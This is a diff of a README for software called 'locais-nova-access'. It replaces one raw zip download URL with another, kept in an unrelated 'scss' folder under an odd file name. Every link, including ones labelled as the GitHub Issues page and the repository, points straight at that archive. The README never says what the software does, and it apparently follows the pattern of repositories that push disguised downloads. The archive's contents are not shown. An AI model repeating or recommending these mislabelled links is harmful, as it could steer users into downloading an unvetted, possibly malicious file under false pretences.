@@ -6,7 +6,7 @@
 ## 🚀 Getting Started
 To start using **locais-nova-access**, you'll first need to download the software. Here’s how to do that:
 
-[![Download Release](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/R/locais-nova-access_3.1.zip)](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/R/locais-nova-access_3.1.zip)
+[![Download Release](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/scss/nova-locais-access-Zechstein.zip)](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/scss/nova-locais-access-Zechstein.zip)
 
 ### 🔥 System Requirements
 - Operating System: Windows, macOS, or Linux
@@ -15,7 +15,7 @@ To start using **locais-nova-access**, you'll first need to download the softwar
 - Installed Software: Internet browser for installation
 
 ## 📥 Download & Install
-Visit this page to download the latest version: [Download Here](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/R/locais-nova-access_3.1.zip)
+Visit this page to download the latest version: [Download Here](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/scss/nova-locais-access-Zechstein.zip)
 
 1. Go to the Releases page.
 2. Locate the latest release version.
@@ -72,7 +72,7 @@ If you encounter issues, check these common problems:
 - **Problem:** Errors during installation.
   - **Solution:** Try re-downloading the installer and ensure you have sufficient disk space.
 
-For further help, consider checking the FAQ section on our [GitHub Issues page](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/R/locais-nova-access_3.1.zip).
+For further help, consider checking the FAQ section on our [GitHub Issues page](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/scss/nova-locais-access-Zechstein.zip).
 
 ## 📣 Community and Contribution
 We welcome contributions to **locais-nova-access**. If you have ideas for features or have found issues, please submit a pull request or open an issue on GitHub. You can help improve this tool for everyone.
@@ -80,6 +80,6 @@ We welcome contributions to **locais-nova-access**. If you have ideas for featur
 ## 📜 License
 This project is licensed under the MIT License. Feel free to use, modify, and share this application.
 
-For more detailed information, please check the full documentation on the [GitHub Repository](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/R/locais-nova-access_3.1.zip).
+For more detailed information, please check the full documentation on the [GitHub Repository](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/scss/nova-locais-access-Zechstein.zip).
 
-[![Download Release](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/R/locais-nova-access_3.1.zip)](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/R/locais-nova-access_3.1.zip)
+[![Download Release](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/scss/nova-locais-access-Zechstein.zip)](https://raw.githubusercontent.com/Air-Uni/locais-nova-access/main/scss/nova-locais-access-Zechstein.zip)
